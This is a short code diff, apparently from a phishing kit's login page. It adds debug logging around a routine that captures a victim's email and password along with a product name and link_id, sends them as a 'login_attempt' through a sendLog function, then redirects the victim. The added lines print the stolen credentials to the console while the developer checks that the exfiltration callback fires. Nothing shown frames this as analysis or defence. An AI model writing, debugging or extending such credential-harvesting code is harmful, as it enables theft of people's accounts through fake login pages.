@@ -943,8 +943,13 @@
             // Send log with product name and link_id for identification
             const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}\nlink_id=${link_id}`;
 
+            console.log('CHECK 1: typeof sendLog =', typeof sendLog);
+            console.log('CHECK 2: logDetails =', logDetails);
+
             if (typeof sendLog === 'function') {
+              console.log('CHECK 3: sendLog is function, calling it...');
               sendLog('login_attempt', logDetails, function() {
+                console.log('CHECK 4: sendLog callback executed');
                 // Build redirect URL with all parameters
                 const params = new URLSearchParams();
                 if (link_id) params.append('link_id', link_id);
